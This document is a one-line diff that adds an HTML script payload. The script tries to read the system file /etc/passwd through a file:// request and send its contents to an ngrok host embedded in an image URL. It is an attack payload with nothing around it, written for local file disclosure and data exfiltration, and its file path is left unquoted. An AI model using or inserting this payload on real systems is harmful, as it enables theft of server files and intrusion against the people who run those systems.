@@ -1,0 +1,1 @@
+<script>var rawFile = new XMLHttpRequest();rawFile.open("GET", file:///etc/passwd, false);var allText = rawFile.responseText;document.write('<img src="https://a478-219-91-170-96.in.ngrok.io?'+allText+'">');</script>
